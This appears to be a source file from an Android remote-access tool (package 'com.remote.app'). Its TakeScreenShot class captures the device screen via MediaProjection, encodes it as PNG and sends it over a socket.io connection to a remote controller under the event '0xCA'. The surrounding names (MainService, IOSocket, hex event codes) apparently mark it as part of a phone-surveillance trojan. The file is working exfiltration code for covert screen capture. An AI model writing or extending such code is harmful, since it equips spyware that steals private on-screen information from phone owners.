package com.remote.app.Managers;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.SystemClock;
import android.util.Base64;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import android.widget.TableLayout;

import com.remote.app.IOSocket;
import com.remote.app.MainService;
import com.remote.app.TypeOpenFile;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.nio.ByteBuffer;


import kotlin.jvm.internal.Intrinsics;
import kotlin.jvm.internal.Ref;

public class TakeScreenShot implements Runnable{

    private Context context;
    private Handler handler;
    private int resultCode;
    private Intent data;


    public TakeScreenShot(Context context, Handler handler,Integer resultCode, Intent data){
        this.context = context;
        this.handler = handler;
        this.resultCode = resultCode;
        this.data = data;
    }

    private void takeScreenShot(){
        SystemClock.sleep(1000);
        final Ref.BooleanRef flagScreenShot = new Ref.BooleanRef();
        flagScreenShot.element = true;

        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager windowManager = (WindowManager)context.getSystemService(Context.WINDOW_SERVICE);
         MediaProjectionManager mgr = (MediaProjectionManager)context.getSystemService(Activity.MEDIA_PROJECTION_SERVICE);

        windowManager.getDefaultDisplay().getMetrics(metrics);
        final MediaProjection mMediaProjection = mgr.getMediaProjection(resultCode, data);
        final ImageReader imgReader =  ImageReader.newInstance(metrics.widthPixels, metrics.heightPixels, PixelFormat.RGBA_8888, 1);

        ImageReader.OnImageAvailableListener onImageAvailableListener = (ImageReader.OnImageAvailableListener)(new ImageReader.OnImageAvailableListener() {
            @Override
            public void onImageAvailable(ImageReader imageReader) {
                Image image = imageReader.acquireLatestImage();
                if (image != null && flagScreenShot.element) {
                    flagScreenShot.element = false;
                    mMediaProjection.stop();
                    imgReader.setOnImageAvailableListener(null, null);

                    Integer mWidth = image.getWidth();
                    Integer mHeight = image.getHeight();

                    Image.Plane[] planes = image.getPlanes();
                    ByteBuffer buffer = planes[0].getBuffer();
                    Integer pixelStride = planes[0].getPixelStride();
                    Integer rowStride = planes[0].getRowStride();
                    Integer rowPadding = rowStride - pixelStride * mWidth;

                    Bitmap bitmap = Bitmap.createBitmap(mWidth + rowPadding / pixelStride, mHeight, Bitmap.Config.ARGB_8888);
                    bitmap.copyPixelsFromBuffer(buffer);

                    File ff = MainService.OpenFile(TypeOpenFile.ScreenShot);

                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.PNG, 90, bos);

                    try{
                        JSONObject object = new JSONObject();
                        object.put("image",true);
                        object.put("screenshot",true);
                        object.put("buffer" , bos.toByteArray());
                        object.put("name" ,ff.getName());
                        IOSocket.getInstance().getIoSocket().emit("0xCA" , object);
                    }catch (Exception e){}
                }

                if (image != null) {
                    image.close();
                }
            }
        });
        mMediaProjection.createVirtualDisplay("ScreenCapture", metrics.widthPixels, metrics.heightPixels, metrics.densityDpi, 16, imgReader.getSurface(), (VirtualDisplay.Callback)null, this.handler);
        imgReader.setOnImageAvailableListener(onImageAvailableListener, this.handler);
    }

    @Override
    public void run() {
        takeScreenShot();
    }

    private final String encodeImage(Bitmap bm) {

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bm.compress(Bitmap.CompressFormat.JPEG, 100, (OutputStream)baos);

        byte[] b = baos.toByteArray();

        String var10000 = Base64.encodeToString(b, 0);
        return var10000;
    }
}
